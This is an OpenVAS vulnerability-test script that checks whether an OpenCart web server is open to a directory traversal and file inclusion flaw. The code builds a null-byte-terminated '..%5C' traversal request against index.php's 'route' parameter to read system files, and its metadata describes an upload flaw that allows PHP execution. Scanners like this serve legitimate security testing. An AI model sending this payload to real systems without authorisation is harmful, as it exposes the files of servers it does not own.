##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_opencart_mult_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# OpenCart Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

tag_impact = "Successful exploitation will allow attacker to upload PHP scripts
and include arbitrary files from local resources via directory traversal attacks.

Impact Level: Application";

tag_affected = "OpenCart version 1.5.2.1 and prior";

tag_insight = "The flaws are due to
- An input passed via the 'route' parameter to index.php is not properly
verified before being used to include files.
- 'admin/controller/catalog/download.php' script does not properly validate
uploaded files, which can be exploited to execute arbitrary PHP code by
uploading a PHP file with an appended '.jpg' file extension.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running OpenCart and is prone to multiple
vulnerabilities.";

if(description)
{
  script_id(802751);
  script_version("$Revision: 7577 $");
  script_bugtraq_id(52957);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-04-18 18:47:56 +0530 (Wed, 18 Apr 2012)");
  script_name("OpenCart Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48762");
  script_xref(name : "URL" , value : "http://www.waraxe.us/advisory-84.html");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522240");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("opencart_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("OpenCart/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("version_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
url = "";
dir = "";
file = "";
files = "";

## Get port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get the dir for KB
if(!dir = get_dir_from_kb(port:port, app:"opencart")){
  exit(0);
}

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = string(dir, "/index.php?route=",
               crap(data:"..%5C",length:3*15),files[file],"%00");

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url,pattern:file, check_header:TRUE))
  {
    security_message(port:port);
    exit(0);
  }
}
